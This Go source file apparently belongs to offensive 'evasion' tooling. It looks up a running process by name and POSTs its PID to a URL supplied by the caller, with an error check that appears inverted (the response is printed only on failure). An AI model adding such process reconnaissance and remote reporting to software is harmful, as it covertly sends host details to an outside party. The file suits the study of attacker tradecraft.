package evasion

import (
	"fmt"
	"log"
	"net/http"
	"net/url"

	ps "github.com/mitchellh/go-ps"
)

func GetPID(name string) int {

	processList, err := ps.Processes()
	if err != nil {
		log.Println("[!] ps.Processes() Failed, are you using windows?")
		return 0
	}
	for x := range processList {
		var process ps.Process
		process = processList[x]
		if process.Executable() == name {
			var pid int = process.Pid()
			println("[+] PID: ", pid)
			return pid
		}
	}
	return 0
}

func SendPID(name string, url_target string) {
	var process int = GetPID(name)
	if process != 0 {
		var data string = fmt.Sprint(process)
		data_post := url.Values{
			"PID": {data},
		}
		resp, err := http.PostForm(url_target, data_post)
		if err != nil {
			fmt.Print(resp)
		}
	}
}
